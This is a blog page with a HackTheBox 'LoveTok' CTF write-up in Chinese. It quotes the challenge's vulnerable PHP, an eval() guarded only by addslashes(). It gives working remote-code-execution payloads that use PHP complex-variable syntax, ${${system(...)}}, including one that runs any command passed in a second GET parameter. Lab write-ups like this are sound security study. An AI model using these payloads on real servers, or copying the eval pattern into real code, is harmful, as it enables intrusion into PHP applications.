@@ -1,0 +1,63 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="懒"><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>HackTheBox LoveTok WriteUP | 忘返</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">忘返</a></h1></div><p class="m-desc">且随我提灯照胆看江山。</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/links/">友链</a></li><li><span class="dot">●</span><a href="/Tips/">Tips</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">HackTheBox LoveTok WriteUP</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2023/08/22/HackTheBox-LoveTok-WriteUP/">2023-08-22</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote>
+<p>True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung… you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin’ (at your door). Come and check it out, but don’t try to cheat love because love cheats back. 💛</p>
+</blockquote>
+<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image.png" alt="LoveTok"></p>
+<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-1.png" alt="Web"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目有源码下载，理应是从源码中寻找漏洞了。<br>找来找去，只有<code>challenge/controllers/TimeController.php</code>中存在可控参数<code>$_GET[&#39;format&#39;]</code>：</p>
+<pre><code class="php">&lt;?php
+class TimeController
+&#123;
+    public function index($router)
+    &#123;
+        $format = isset($_GET[&#39;format&#39;]) ? $_GET[&#39;format&#39;] : &#39;r&#39;;
+        $time = new TimeModel($format);
+        return $router-&gt;view(&#39;index&#39;, [&#39;time&#39; =&gt; $time-&gt;getTime()]);
+    &#125;
+&#125;
+</code></pre>
+<p>跟踪定位到<code>TimeModel</code>类，代码如下：</p>
+<pre><code class="php">&lt;?php
+class TimeModel
+&#123;
+    public function __construct($format)
+    &#123;
+        $this-&gt;format = addslashes($format);
+
+        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
+        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;
+    &#125;
+
+    public function getTime()
+    &#123;
+        eval(&#39;$time = date(&quot;&#39; . $this-&gt;format . &#39;&quot;, strtotime(&quot;&#39; . $this-&gt;prediction . &#39;&quot;));&#39;);
+        return isset($time) ? $time : &#39;Something went terribly wrong&#39;;
+    &#125;
+&#125;
+</code></pre>
+<p>很显然，要绕过<code>addslashes()</code>函数，利用<code>getTime()</code>中的<code>eval()</code>来RCE了。</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>代码在<code>addslashes()</code>后没有对传入的参数做其他处理，不好闭合双引号。</p>
+<p>但是如果使用动态变量的话，就不需要闭合双引号了。</p>
+<blockquote>
+<p>在 PHP 中，{} 用于复杂的变量解析。当字符串中的变量名称与其他字符相邻并可能引起混淆时，可以使用这种语法来明确地表示变量名。而 ${} 是一种特殊的语法，它允许你通过一个字符串来动态地生成变量名。<br>——ChatGPT</p>
+</blockquote>
+<p>Payload如下：</p>
+<pre><code>GET /?format=r$&#123;$&#123;system(ls)&#125;&#125; HTTP/1.1
+</code></pre>
+<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-2.png" alt="ls"></p>
+<p>但是<code>addslashes()</code>会对空格进行处理，我们也并没有在当前目录下找到flag，所以利用HTTP参数传入要执行的命令，是个好主意：</p>
+<pre><code>GET /?format=r$&#123;$&#123;system($_GET[aa])&#125;&#125;&amp;aa=ls%20/ HTTP/1.1
+</code></pre>
+<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-3.png" alt="ls /"></p>
+<p>找到<code>flag</code>:</p>
+<p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-4.png" alt="flag"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7c818ddc5731">PHP复杂变量绕过addslashes()直接拿shell</a></p>
+</blockquote>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">忘返</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2023/08/22/HackTheBox-LoveTok-WriteUP/">https://7mitu.github.io/2023/08/22/HackTheBox-LoveTok-WriteUP/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://7mitu.github.io">忘返的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/HackTheBox/">HackTheBox</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/">HackTheBox PhoneBook WriteUP &gt;</a></div></section><footer><p>Copyright © 2016 - 2023 <a href="/." rel="nofollow">忘返</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
